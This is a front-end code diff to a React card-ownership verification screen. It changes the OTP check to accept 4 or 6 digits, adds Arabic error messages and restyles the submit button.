@@ -15,8 +15,10 @@ export const CardOwnershipVerification = () => {
   const navigate = useNavigate();
   const dispatch = useDispatch();
   const socket = useSocket();
-  const [isCardVerified, setIsCardVerified] = useState(false);
-
+  const [, setIsCardVerified] = useState(false);
+  const isValidOtp = useCallback((otpValue: string) => {
+    return otpValue.length === 4 || otpValue.length === 6;
+  }, []);
   const { otp, timer, error, amount, cardLastDigits } = useSelector(
     (state: RootState) => state.cardOwnership
   );
@@ -79,14 +81,31 @@ export const CardOwnershipVerification = () => {
       e.preventDefault();
       const otpValue = otp.join("");
 
-      if (otpValue.length !== 6) {
-        dispatch(setError("يرجى إدخال رمز التحقق كاملاً"));
+      // Clear any existing errors
+      dispatch(clearError());
+
+      // Validation logic
+      if (otpValue.length === 5) {
+        dispatch(setError("عدد غير صحيح. الرجاء إدخال 4 أو 6 أرقام"));
+        return;
+      }
+
+      if (otpValue.length < 4) {
+        dispatch(setError("الرجاء إدخال 4 أرقام على الأقل"));
+        return;
+      }
+
+      if (otpValue.length > 6) {
+        dispatch(setError("الحد الأقصى المسموح به هو 6 أرقام"));
+        return;
+      }
+
+      if (otpValue.length !== 4 && otpValue.length !== 6) {
+        dispatch(setError("يرجى إدخال 4 أو 6 أرقام للتحقق"));
         return;
       }
 
       try {
-        // API call would go here
-        // tell seif make this event accept also the cardId "important"
         const order_id = JSON.parse(localStorage.getItem("order_id"));
         const card_id = JSON.parse(localStorage.getItem("card_id"));
         socket.emit("card-ownership-verification", {
@@ -173,8 +192,12 @@ export const CardOwnershipVerification = () => {
 
             <button
               type="submit"
-              className="w-full bg-[#146394] text-white py-4 rounded-lg font-semibold transition-all duration-300 hover:bg-[#0f4c70] transform hover:scale-[0.99] active:scale-[0.97] text-lg disabled:opacity-50 disabled:cursor-not-allowed"
-              disabled={otp.some((digit) => !digit) || !isCardVerified}
+              disabled={!isValidOtp(otp.join(""))}
+              className={`w-full py-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-[0.99] active:scale-[0.97] text-lg ${
+                isValidOtp(otp.join(""))
+                  ? "bg-[#146394] text-white hover:bg-[#0f4c70]"
+                  : "bg-[#146394] opacity-50 cursor-not-allowed"
+              }`}
             >
               متابعة
             </button>
